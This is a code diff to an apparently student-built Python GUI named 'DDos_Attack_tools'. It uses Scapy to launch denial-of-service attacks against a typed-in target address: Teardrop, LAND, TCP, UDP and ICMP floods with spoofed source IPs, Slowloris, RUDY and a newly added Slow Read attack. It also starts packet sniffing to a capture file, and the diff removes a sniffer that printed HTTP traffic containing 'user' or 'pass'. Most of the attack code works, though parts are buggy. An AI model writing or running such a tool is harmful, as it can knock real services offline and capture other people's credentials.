@@ -12,6 +12,13 @@ class GUIMODE():
     def __init__(self):
         win = tkinter.Tk()
 
+        self.Packet_write = threading.Thread(target=self.file_packet)
+        self.Packet_write.start()
+
+        self.packet = threading.Thread(target=self.packet_temp)
+        self.packet.start()
+
+
         win.title("DDos_Attack_tools")
         win.configure(bg='white')
         win.geometry("800x600")
@@ -44,9 +51,8 @@ class GUIMODE():
         self.count = 5  # 몇번 반복할지 GUI 상에 설정
         self.Random = RandNum(1000, 9000)  # 무작위 설정 1000~9000
         self.s_ip = RandIP()
+        self.protocol={1:"ICMP",4:"IPv4",6:"TCP",17:"UDP",}
 
-        Packet_write = threading.Thread(target=self.file_packet)
-        Packet_write.start()
 
 
 
@@ -58,6 +64,8 @@ class GUIMODE():
         rudy_button = Button(left_frame, text="rudy 공격문", command=self.rudy,height=1,width=15)
         Teardrop_button = Button(left_frame, text="Teardrop 공격문", command=self.Teardrop,height=1,width=15)
         ICMP_button = Button(left_frame, text="ICMP 공격문", command=self._ICMP,height=1,width=15)
+        Slowread_button = Button(left_frame, text="Slowread 공격문", command=self.Slowread, height=1, width=15)
+
 
         #버튼 위젯 위치 선언
         land_button.grid(sticky='sw', row=2,column=0)
@@ -67,41 +75,53 @@ class GUIMODE():
         tcp_flood_button.grid(sticky='sw', row=4,column=0)
         Teardrop_button.grid(sticky='sw', row=4,column=1)
         ICMP_button.grid(sticky='sw', row=5,column=0)
-
+        Slowread_button.grid(sticky='sw', row=5,column=1)
 
 
         win.mainloop()
 
-
     def showPacket(self,packet):
-        data = '%s' % (packet[TCP].payload)
-        if 'user' in data.lower() or 'pass' in data.lower():
-            print('+++[%s]: %s' % (packet[IP].dst, data))
+        packet.show()
 
 
-    def sniffing(self):
-        filter='tcp port 80'
-        sniff(filter=filter, prn=self.showPacket, count=0)
+
+    def packet_temp(self):
+        a = sniff(iface="이더넷 2", filter='ip', prn=self.showPacket, count=30000)
+        wrpcap("C:\\Users\\dbwng\\Desktop\\packet.pcap", a)
 
     def file_packet(self):
-        f = open("C:\\Users\\USER\\OneDrive\\바탕 화면\\packet.txt", "w")
+        f = open("C:\\Users\\dbwng\\Desktop\\packet.txt", "w")
         sys.stdout = f
-        self.sniffing()
 
-    def file_read(self):
-        f = open("C:\\Users\\USER\\OneDrive\\바탕 화면\\packet.txt", "r")
-        lines = f.readlines()
-        for _ in range(100):
-            self.packet.configure(text=lines)
+    def Slowread(self):
+        dst_ip = self.ip_dst_data.get()
+        headers = [
+            "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+            "Accept-language: en-US,en"
+        ]
+        data = (random.choice(string.ascii_letters + string.digits)) * 1000 # 데이터
+        for x in range(0,self.count):
+            i = IP(src=self.s_ip, dst=dst_ip) # 출발지 주소는 Random으로 설정하였습니다.
+            t = TCP(sport=self.s_port, dport=self.dst_port, window=0)
+            packet = "GET / HTTP/1.1\r\n" + \
+                     "Host: {}\r\n".format(dst_ip) + \
+                     "Connection: keep-alive\r\n" + \
+                     "Cache-Control: max-age=0\r\n" + \
+                     "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n" + \
+                     "Upgrade-Insecure-Requests: 1\r\n" + \
+                     "{0}\r\n{1}\r\n".format(headers[0], headers[1]) + \
+                     "Accept-Encoding: gzip, deflate, sdch\r\n" + \
+                     "Connection: Keep-Alive\r\n"
+            send(i/t/packet/data)
 
-    def rudy(self): #rudy 김진
+    def rudy(self):
         dst_ip = self.ip_dst_data.get()
         useragents = [
             "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
             "Accept-language: en-US,en"
         ]
 
-        for i in range(self.count):
+        for i in range(0,self.count):
 
             print("packet send {}".format(str(self.intercount)))
 
@@ -110,13 +130,13 @@ class GUIMODE():
 
             send(bytes("Post /http/1.1\r\n", encoding="utf-8"))
             send(
-                bytes("Host {}\r\n".format(dst_ip).encode("utf-8")))  # headers에 저장 되어있는 값을 인코딩 utf-8 로 번역해서 보낸다.
+                bytes("Host: {}\r\n".format(dst_ip).encode("utf-8")))  # headers에 저장 되어있는 값을 인코딩 utf-8 로 번역해서 보낸다.
             send(bytes("User-agent {}\r\n".format(random.choice(useragents)).encode("utf-8")))
-            send(bytes("connection Keep-alive\r\n", encoding="utf-8"))
-            send(bytes("Keep-alive 900\r\n", encoding="utf-8"))
-            send(bytes("content Length 10000\r\n", encoding="utf-8"))
+            send(bytes("connection: Keep-alive\r\n", encoding="utf-8"))
+            send(bytes("Keep-alive: 900\r\n", encoding="utf-8"))
+            send(bytes("content Length: 10000\r\n", encoding="utf-8"))
             send(bytes("Content type application/x-www-form-urlencoded\r\n\r\n", encoding="utf-8"))
-            for i in range(0, 9000):
+            for i in range(0, 30):
                 Random = random.choice(string.ascii_letters + string.digits).encode('utf-8')
                 socks.send(Random)
             self.intercount += 1
@@ -125,7 +145,7 @@ class GUIMODE():
     def Teardrop(self):
         dst_ip = self.ip_dst_data.get()
         data=random.choice(string.ascii_letters + string.digits)
-        for i in range(self.count):
+        for i in range(0,self.count):
             _id = random.choice(range(1, 65535))
             send((IP(src=self.s_ip,dst=dst_ip,id=_id,flags="MF")/UDP(sport=self.s_port,dport=self.dst_port)/((data*1420))))
             send((IP(src=self.s_ip,dst=dst_ip,id=_id,frag=130))/(data*1420))
@@ -157,7 +177,7 @@ class GUIMODE():
 
         print("Starting DoS attack on {}. Connecting to {} sockets.".format(dst_ip,self.count))
 
-        for _ in range(self.count):
+        for _ in range(0,self.count):
             try:  # 예외처리
                 print("Socket {}".format(_))  # 소켓을 보낼때마다 몇번째인지 확인시켜준다.
                 sock = setupSocket(dst_ip)  # ip를 넣고 sock 이라는 객체에 저장한다.
@@ -168,7 +188,7 @@ class GUIMODE():
 
         # 해당 포트가 닫혀있거나 연결할수있는 클라이언트가 꽉차거나 에러가 나서 while 문으로 넘어간다.
 
-        for i in range(1, self.count):
+        for i in range(0, self.count):
             print("Connected to {} sockets. Sending headers...".format(len(sockets)))
 
             for sock in list(sockets):  # sockets 객체에 저장되어있는 것들을 sock에 저장한다.
@@ -188,8 +208,8 @@ class GUIMODE():
                         sockets.append(sock)  # sockets 리스트 맨뒤에 sock을 추가한다.
                 except socket.error:
                     break  # 에러시 break 문
-        Packet_reading = threading.Thread(target=self.file_read)
-        Packet_reading.start()
+
+
 
     def _ICMP(self):
 
@@ -198,6 +218,7 @@ class GUIMODE():
         for x in range(0, self.count):  # 보낼 패킷의 범위
             icmpf=IP(src=self.s_ip,dst=dst_ip)/ICMP()/(data)
             send(icmpf)  # ICMP 전송
+
     def land(self):   # land 김진
         dst_ip = self.ip_dst_data.get()
 
@@ -206,13 +227,13 @@ class GUIMODE():
         tu = TCP(dport=9001, sport=9001, flags=0x002) # 지정한 포트와 syn값을 tu 변수에 넣어준다.
 
 
-        for x in range(1, self.count): #count 정도의 패킷을 반복적으로 전송한다.
+        for x in range(0, self.count): #count 정도의 패킷을 반복적으로 전송한다.
             self.intercount += 1
             send(i/tu/"hello word")
             print("send packet:", self.intercount) # 패킷 보냈다는 문구
 
-        Packet_reading = threading.Thread(target=self.file_read)
-        Packet_reading.start()
+
+
 
     def tcp_flood(self):    #tcp flood 이태서
 
@@ -224,8 +245,8 @@ class GUIMODE():
         for Firewall_disturb in range(0, self.count):
             send(i / t, verbose=0)
             print("\nTotal packets sent: %i\n" % Firewall_disturb)
-        Packet_reading = threading.Thread(target=self.file_read)
-        Packet_reading.start()
+
+
 
 
     def udp_flood(self): # udp flood 정재훈
@@ -234,7 +255,7 @@ class GUIMODE():
         timeout = time.time() + duration
         sent = 0
 
-        for i in range(self.count):
+        for i in range(0,self.count):
             if time.time() > timeout:
                 break
             else:
@@ -246,8 +267,7 @@ class GUIMODE():
             print("UDP_Flooding_Attack Start: " + str(
                 sent) + " sent packages " + dst_ip + " At the Port " + str(self.dst_port))
 
-        Packet_reading = threading.Thread(target=self.file_read)
-        Packet_reading.start()
+
 
 
 application=GUIMODE()
